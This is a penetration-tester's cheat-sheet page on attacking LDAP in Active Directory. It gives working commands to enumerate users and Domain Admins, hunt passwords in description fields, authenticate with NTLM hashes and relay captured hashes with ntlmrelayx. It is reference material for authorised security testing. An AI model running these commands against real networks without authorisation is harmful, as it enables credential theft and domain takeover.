# LDAP (389, 636)

!!! tip "Start here"
    Try anonymous bind first: `ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN"`. If it returns data you have unauthenticated enumeration of the entire directory, usernames, computers, group memberships, sometimes passwords in description fields.

---

## Enumeration

```bash
nmap -p 389,636 --script ldap-rootdse,ldap-search $DC_IP
nmap -n -sV --script "ldap* and not brute" $DC_IP
```

---

## Anonymous Bind

```bash
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN"
```

---

## Authenticated Enumeration

```bash
# All users
ldapsearch -x -H ldap://$DC_IP -D 'user@$DOMAIN' -w '<pass>' \
  -b "$BASE_DN" "(objectClass=user)" sAMAccountName

# All computers
ldapsearch -x -H ldap://$DC_IP -D 'user@$DOMAIN' -w '<pass>' \
  -b "$BASE_DN" "(objectClass=computer)" cn

# Admin accounts (adminCount=1)
ldapsearch -x -H ldap://$DC_IP -D 'user@$DOMAIN' -w '<pass>' \
  -b "$BASE_DN" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Domain Admins group membership
ldapsearch -x -H ldap://$DC_IP -D 'user@$DOMAIN' -w '<pass>' \
  -b "$BASE_DN" "(memberOf=CN=Domain Admins,CN=Users,$BASE_DN)" sAMAccountName

# Passwords stored in description fields
ldapsearch -x -H ldap://$DC_IP -D 'user@$DOMAIN' -w '<pass>' \
  -b "$BASE_DN" "(description=*)" sAMAccountName description
```

---

## CrackMapExec

```bash
nxc ldap $DC_IP -u <user> -p <pass> --users
nxc ldap $DC_IP -u <user> -H <hash>
```

---

## NTLM Relay to LDAP

If you capture NTLMv2 hashes via LLMNR/NBT-NS poisoning, relay them to LDAP:

```bash
ntlmrelayx.py -t ldap://$DC_IP --dump
```

!!! tip "Real-world"
    Anonymous LDAP is still common on internal AD environments, it's rarely intentional, usually a misconfiguration from legacy requirements. Even with credentials, `description` fields are a reliable place to find passwords that sysadmins embedded years ago. Pull the full dump and grep it offline rather than running targeted queries.
